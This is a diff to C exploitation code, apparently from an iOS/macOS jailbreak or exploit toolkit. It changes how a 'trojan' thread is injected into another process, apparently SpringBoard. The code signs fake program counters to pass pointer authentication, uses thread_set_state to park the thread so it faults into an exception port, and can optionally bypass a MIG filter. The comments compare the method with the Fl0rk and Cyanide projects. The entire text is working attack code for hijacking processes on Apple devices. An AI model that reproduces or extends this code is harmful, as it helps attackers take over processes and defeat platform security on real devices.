@@ -1824,9 +1824,23 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
 
-    // Fl0rk: PAC'd FAKE_PC 0x301 as start_routine.
+    // 5eca9e0 DIAG: canary SB=DEAD before AND after create with PAC'd 0x301
+    // start_routine → libpthread rejects unmapped PC, returns 0, never stores
+    // pthread_t. Use shared-cache getpid (stripped) so create materializes the
+    // thread; park at FAKE_PC_TROJAN via thread_set_state before resume.
+    // (Fl0rk/Cyanide pass PAC'd 0x301 — works on their targets; SB here rejects.)
+    uint64_t startRoutine = native_strip((uint64_t)dlsym(RTLD_DEFAULT, "getpid"));
+    if (!startRoutine) {
+        RC_DIAG("dlsym(getpid) strip failed");
+        do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+        return -1;
+    }
+    RC_DIAG("pthread start=stripped_getpid 0x%llx (not PAC 0x301 — SB rejects)",
+            (unsigned long long)startRoutine);
+
     uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
+                                                trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
     if (!g_RC_success || createResult != 0) {
         RC_DIAG("pthread_create failed result=%llu success=%d",
                 (unsigned long long)createResult, (int)g_RC_success);
@@ -1835,34 +1849,25 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
 
-    // Read via SB MMU first (authoritative), then our remap.
+    // Read via SB MMU (authoritative).
     do_remote_call_temp(100, "memset", bounce, 0, 8, 0, 0, 0, 0, 0);
     do_remote_call_temp(100, "memcpy", bounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
     clear_remote_shmem_cache();
-    uint64_t pthreadAddrBounce = remote_read64(bounce);
-    clear_remote_shmem_cache();
-    uint64_t pthreadAddrRemap = remote_read64(trojanMemTemp);
-    RC_DIAG("post-pthread SB=0x%llx remap=0x%llx out=0x%llx",
-            (unsigned long long)pthreadAddrBounce,
-            (unsigned long long)pthreadAddrRemap,
-            (unsigned long long)trojanMemTemp);
-
-    uint64_t pthreadAddr = pthreadAddrBounce;
+    uint64_t pthreadAddr = remote_read64(bounce);
+    RC_DIAG("post-pthread SB=0x%llx out=0x%llx",
+            (unsigned long long)pthreadAddr, (unsigned long long)trojanMemTemp);
     do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
 
     if (!pthreadAddr || pthreadAddr == kCanary) {
         if (pthreadAddr == kCanary) {
-            RC_DIAG("create ret=0 but SB out still CANARY — start_routine rejected");
+            RC_DIAG("create ret=0 but SB out still CANARY — start still rejected");
         } else {
-            RC_DIAG("create ret=0 SB out=0 — create stored NULL or cleared slot");
+            RC_DIAG("create ret=0 SB out=0");
         }
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
-    if (pthreadAddrRemap != pthreadAddr) {
-        RC_DIAG("STACK REMAP MISMATCH sb=0x%llx remap=0x%llx — use SB value",
-                (unsigned long long)pthreadAddr, (unsigned long long)pthreadAddrRemap);
-    }
+    (void)remoteCrashSigned; // used below when parking at 0x301
     uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
     RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
     if (!g_RC_success || !callThreadPort) {
@@ -1902,8 +1907,36 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if(useMigFilterBypass)
         mig_bypass_pause();
 
-    // Fl0rk/Cyanide: start_routine already FAKE_PC 0x301 — resume faults into
-    // secondExceptionPort. No thread_set_state park needed.
+    // start_routine was real getpid — park at FAKE_PC_TROJAN before resume so
+    // the first stable wait catches 0x301 (Fl0rk/Cyanide post-create shape).
+    {
+        arm_thread_state64_internal park = {0};
+        uint64_t stateBuf = do_remote_call_temp(100, "malloc",
+                                                sizeof(arm_thread_state64_internal),
+                                                0, 0, 0, 0, 0, 0, 0);
+        if (!g_RC_success || !stateBuf) {
+            RC_DIAG("malloc stateBuf for 0x301 park failed");
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+        sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
+        remote_write(stateBuf, &park, sizeof(park));
+        uint64_t setKr = do_remote_call_temp(100, "thread_set_state",
+                                             callThreadPort,
+                                             ARM_THREAD_STATE64,
+                                             stateBuf,
+                                             ARM_THREAD_STATE64_COUNT,
+                                             0, 0, 0, 0);
+        RC_DIAG("park synthetic 0x301 via thread_set_state kr=%llu pac301=0x%llx",
+                (unsigned long long)setKr, (unsigned long long)remoteCrashSigned);
+        do_remote_call_temp(100, "free", stateBuf, 0, 0, 0, 0, 0, 0, 0);
+        if (!g_RC_success || setKr != 0) {
+            RC_DIAG("thread_set_state park failed");
+            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
+            return -1;
+        }
+    }
+
     RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
 
     uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
